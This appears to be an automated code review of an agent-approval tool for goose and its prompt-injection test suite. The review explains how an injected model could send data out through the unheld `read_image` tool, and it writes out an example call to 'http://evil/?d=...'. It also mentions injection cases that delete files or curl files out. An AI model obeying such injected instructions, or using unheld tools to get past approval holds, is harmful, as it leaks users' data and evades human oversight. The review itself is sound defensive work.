# goose-triggers 0.0.3: automated code review, round 1 of 3

Verdict: NOT FIT

Review of `git diff v0.0.2..HEAD` (d1ce153, f081d99, 426da64), read only, nothing built or run. goose behaviour checked against the goose clone at tag v1.57.0. The pinned actions/checkout SHA was checked against the v7.0.1 tag (it matches).

1. **blocker**: the suite's evidence is selected, the README overstates it, and the example holds leave a way to send data out. Files: README.md:75-85, src/hostile.rs:25 and 91-317, examples/config.yaml:21.
   The example recipes load goose's developer extension. In goose 1.57.0 that extension has `read_image`, which does an HTTP GET to any http(s) URL (`platform_extensions/developer/image.rs`, `load_url_bytes`, no host restriction). It also has `tree`, which lists any directory. The example rules hold only `[shell, write, edit]` plus the implicit holds, so a model that obeys an injection can send whatever is in its context without being held: `read_image {"source": "http://evil/?d=..."}`. That context includes the event's fields, a directory listing from `tree`, and the contents of the new file once the user approves its read (an F1-style file-name injection does exactly this).
   Every one of the suite's 11 harmful cases names a held tool in its `[[call ...]]` mark, and the scripted model makes only the named call. So "With the example rules' holds, it carried out 0 of 11" is guaranteed by how the cases were chosen. It does not measure what the example holds stop. On top of that, the heading "what holds stop", the row "send a secret file to a server … held", "The scripted model plays the worst case" and the example config's comment "goose may read and list freely" together tell a reader that the example holds stop data from being sent out. They do not. The README's caveat ("an extension's tools you did not list") reads as other extensions, not the developer extension the examples use.
   Fix:
   - Add `read_image` to the example rules' holds (examples/config.yaml, README Use step 2, `EXAMPLE_HOLDS`) and to the README's "hold `shell`, `write` and `edit` whenever you hold anything" advice. Reword the config comment.
   - Add a case that sends data out through `read_image` to the canary server (a Request canary). With the old holds it must show as carried out; with the new holds, as held.
   - Change "plays the worst case" to say what the model really is: it makes exactly the call each injection names, and never looks for a tool that is not held.
   - Have the suite's summary say that each case's route is fixed by its mark.

2. **minor**: the summary counts F6 as the structure check's work, and two canaries can't show what they claim. Files: src/hostile.rs:299-315, 207, 180-189, 792.
   - F6 fails as `ValuesBreakRecipe`: goose itself cannot parse the recipe with that value, and the suite's own note says so. Yet the summary says "The recipe-structure check refused 3 of 3". Only W7 and W8 exercise the structure comparison (`same_recipe`).
   - W8's canary (`W8-ran`) can never trip: the scripted model never calls the sub-recipe, so even an unchecked recipe would not make the file. That contradicts "Each harmful call that runs trips a local canary".
   - W6's canary checks only the `touch`, not the hooks file the case says it empties.
   Fix:
   - Report F6 under its own count ("goose cannot read the recipe with this value"), or replace it with a file-name value that renders.
   - Make the obeying model call the sub-recipe tool in W8 (no check, holds off) or drop W8's canary and say that refusal is the only evidence.
   - Add a `Changed` canary on hooks.json for W6.

3. **minor**: selftest item 10 says "the call never runs" without showing it. File: src/selftest.rs:605-640 (README.md:70).
   After `reject`, the daemon is never started again, so nothing could resume the run whether or not the withdrawal worked. That the run cannot resume is shown only by the store unit test. Fix: after `reject`, start `goose-triggers run` again and wait past a scheduling cycle. Then check the run is still `rejected`, no goose process started for it, and `selftest-orders.txt` lacks A-3003.

4. **minor**: `approve` can now end silently without approving. Files: src/main.rs:96-105, src/commands.rs:263-280.
   SIGPIPE goes back to SIG_DFL for `approve` too, and `approve` prints the call before it records the approval. With `goose-triggers approve 3 --yes | head -1`, once `head` exits the next `println!` kills the process silently, before `approve_call`. The shell reports `head`'s 0 and the run stays held. In v0.0.2 the same case panicked with a visible "Broken pipe" message. Fix: restore SIG_DFL only for `status` and `log`. For `approve` and `reject`, keep SIGPIPE ignored and treat EPIPE as a quiet exit only after the decision is recorded (or, with `--yes`, record it before printing).

5. **minor**: CI supply chain. File: .github/workflows/ci.yml:41-58.
   The goose tarball is installed and run with no integrity check. `GH_TOKEN` is in the environment of the same step that runs the downloaded binary (`goose --version`). The token is read-only and no secrets exist, so the impact is small. Fix:
   - Pin the sha256 for v1.57.0. The release API gives `sha256:e54036f3b7f95d3b0d7854c09465af5ef52a28c7fa03d2497d0ea68a6382282d` for goose-x86_64-unknown-linux-gnu.tar.bz2.
   - For `latest`, check the asset's `digest` from the same API call.
   - Pass the token only to the API `curl`, not to the step that runs goose.
   - Add `set -o pipefail` (the default `bash -e` lets a failed API call reach the download with an empty tag).

6. **nit**: README.md:11 and 208 say CI runs "on every push". The workflow runs on pushes to `main` and `v*` tags only. Also, GitHub turns off scheduled workflows after 60 days with no repository activity, so "every day" can stop without any sign. Say "every push to main", and note the 60-day limit. The lint job's unpinned `stable` clippy will also break builds when new lints arrive; pin the toolchain.

7. **nit**: two problems in `run_goose` and `finish`. File: src/runner.rs:464-476 and 792.
   - The new fallible store calls (`store.run(..)?`, `set_session_if_unset(..)?`, `store.log(..)?`) come before `set_pid(run.id, None)`. A store error there leaves a held run with a stale pid, so it never looks settled (the suite's loop waits on `pid.is_none()`). Move `set_pid(None)` first, or make these calls non-fatal.
   - When the session is found by name, the failure text still says "no session was recorded", while `log` shows "goose session: …". Say "goose-triggers' hooks recorded no session".

8. **nit**: the suite's commands put canary paths into `sh` unquoted (`rm -f {}`, `curl … @{}`, `touch {}`, `echo ran > {}`): src/hostile.rs:96-100, 116, 128, 178, 281. A TMPDIR with a space makes the no-holds pass fail as if the canaries did not work. Use `crate::util::sh_quote`.

Checked and found sound:
- The 408/400 body handling (`Announced` over `Deadline`), and HEAD /health.
- Withdrawing an approval in `Store::decide` (one IMMEDIATE transaction; races with the runner's APPROVED->RUNNING transition resolve either way).
- `approve` needing `--yes` (it checks stdin's tty).
- The session lookup by name, folder and time.
- The suite's pass logic for the cases it has: the no-holds pass must trip every canary, and the holds-on pass must hold the first injected call with no canary tripped, so broken hooks or a missing hold fail the suite.
- The workflow's `permissions: contents: read`, `persist-credentials: false` and the SHA-pinned checkout.
